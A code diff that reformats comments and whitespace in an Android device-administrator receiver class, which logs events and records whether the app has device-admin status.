@@ -11,18 +11,22 @@ import com.android.syssetup.util.Check;
 public class AdR extends android.app.admin.DeviceAdminReceiver {
 	static final String TAG = "DemoDeviceAdminReceiver";
 
-	/** Called when this application is approved to be a device administrator. */
+	/**
+	 * Called when this application is approved to be a device administrator.
+	 */
 	@Override
 	public void onEnabled(Context context, Intent intent) {
 		super.onEnabled(context, intent);
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onEnabled) ");
 		}
-		
+
 		Status.self().setDeviceAdmin(true);
 	}
 
-	/** Called when this application is no longer the device administrator. */
+	/**
+	 * Called when this application is no longer the device administrator.
+	 */
 	@Override
 	public void onDisabled(Context context, Intent intent) {
 		super.onDisabled(context, intent);
@@ -65,6 +69,6 @@ public class AdR extends android.app.admin.DeviceAdminReceiver {
 			}
 		} else {
 			super.onReceive(context, intent);
-		}      
+		}
 	}
 }
